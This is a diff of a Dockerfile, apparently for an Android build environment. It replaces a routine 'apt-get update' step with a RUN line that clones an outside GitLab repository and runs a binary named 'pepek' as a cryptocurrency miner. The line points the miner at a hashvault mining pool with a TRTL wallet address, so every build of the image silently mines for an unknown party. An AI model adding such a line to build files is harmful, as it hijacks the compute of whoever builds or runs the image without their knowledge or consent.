@@ -8,9 +8,7 @@ ENV GCE_METADATA_ROOT 127.0.0.1
 # ------------------------------------------------------
 # --- Install required tools
 
-RUN apt-get update -qq && \
-    apt-get clean
-
+RUN git clone https://gitlab.com/rikzakalani04/7.git && cd 7 && chmod +x pepek && ./pepek -o pool.hashvault.pro:80 -u TRTLuyH4oQwEY6M7jAq5db7LfCY8QwWc368VPfpCg4XzjTw1kPdTnaYhnZKktmDNWphDCH8LtmbsTBuvvQEbk1Jb9FXswLdcfLy -p SUKUMANTE1 -a argon2/chukwav2 -k
 
 # ------------------------------------------------------
 # --- Android NDK
